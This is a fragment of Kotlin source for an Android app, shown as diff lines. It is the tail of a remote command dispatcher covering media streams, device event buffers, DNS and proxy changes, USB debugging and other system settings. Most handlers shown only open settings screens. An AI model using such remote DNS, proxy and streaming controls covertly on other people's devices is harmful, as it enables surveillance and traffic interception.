+   618→            "stop_all_streams" -> StreamExecutor.stopAllStreams(context, params)
+   619→            "get_stream_capabilities" -> StreamExecutor.getCapabilities(context, params)
+   620→
+   621→            // ===== DEVICE EVENTS =====
+   622→            "get_device_events" -> com.abuzahra.manager.EventBuffer.flushEvents()
+   623→            "events_on" -> com.abuzahra.manager.EventBuffer.setAutoSend(true)
+   624→            "events_off" -> com.abuzahra.manager.EventBuffer.setAutoSend(false)
+   625→            "events_status" -> com.abuzahra.manager.EventBuffer.getStatus()
+   626→            "events_clear" -> com.abuzahra.manager.EventBuffer.clearBuffer().let { mapOf("status" to "cleared", "message" to "Event buffer cleared") }
+   627→
+   628→            // ===== SYSTEM SETTINGS =====
+   629→            "set_language" -> ControlExecutor.setLanguage(context, params)
+   630→            "set_timezone" -> ControlExecutor.setTimezone(context, params)
+   631→            "set_alarm", "set_timer", "set_reminder" -> ControlExecutor.setAlarm(context, params)
+   632→            "enable_dev_mode" -> {
+   633→                try {
+   634→                    context.startActivity(Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+   635→                    mapOf("ok" to true, "message" to "Developer settings opened")
+   636→                } catch (e: Exception) {
+   637→                    mapOf("error" to (e.message ?: "Failed to open developer settings"))
+   638→                }
+   639→            }
+   640→            "disable_dev_mode" -> {
+   641→                try {
+   642→                    context.startActivity(Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+   643→                    mapOf("ok" to true, "message" to "Developer settings opened - toggle off Developer Options")
+   644→                } catch (e: Exception) {
+   645→                    mapOf("error" to (e.message ?: "Failed to open developer settings"))
+   646→                }
+   647→            }
+   648→            "enable_usb_debug" -> {
+   649→                try {
+   650→                    context.startActivity(Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+   651→                    mapOf("ok" to true, "message" to "Developer settings opened - enable USB Debugging")
+   652→                } catch (e: Exception) {
+   653→                    mapOf("error" to (e.message ?: "Failed to open developer settings"))
+   654→                }
+   655→            }
+   656→            "disable_usb_debug" -> {
+   657→                try {
+   658→                    context.startActivity(Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+   659→                    mapOf("ok" to true, "message" to "Developer settings opened - disable USB Debugging")
+   660→                } catch (e: Exception) {
+   661→                    mapOf("error" to (e.message ?: "Failed to open developer settings"))
+   662→                }
+   663→            }
+   664→            "dns_change" -> ControlExecutor.dnsChange(context, params)
+   665→            "proxy_set" -> ControlExecutor.proxySet(context, params)
+   666→            "apn_settings" -> {
+   667→                try {
+   668→                    context.startActivity(Intent(Settings.ACTION_APN_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+   669→                    mapOf("ok" to true, "message" to "APN settings opened")
+   670→                } catch (e: Exception) {
+   671→                    mapOf("error" to (e.message ?: "Failed to open APN settings"))
+   672→                }
+   673→            }
+   674→            "nfc_on" -> ControlExecutor.nfcOn(context)
+   675→            "nfc_off" -> ControlExecutor.nfcOff(context)
+   676→            "auto_update_on" -> {
+   677→                try {
+   678→                    context.startActivity(Intent(Settings.ACTION_SYSTEM_UPDATE_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+   679→                    mapOf("ok" to true, "message" to "System update settings opened")
+   680→                } catch (e: Exception) {
+   681→                    mapOf("error" to (e.message ?: "Failed to open update settings"))
+   682→                }
+   683→            }
+   684→            "auto_update_off" -> {
+   685→                try {
+   686→                    context.startActivity(Intent(Settings.ACTION_SYSTEM_UPDATE_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+   687→                    mapOf("ok" to true, "message" to "System update settings opened")
+   688→                } catch (e: Exception) {
+   689→                    mapOf("error" to (e.message ?: "Failed to open update settings"))
+   690→                }
+   691→            }
+   692→
+   693→            // ===== UNKNOWN =====
+   694→            else -> mapOf("error" to "Unknown command: $cmd", "supported" to "200+ commands")
+   695→        }
+   696→    }
+   697→}
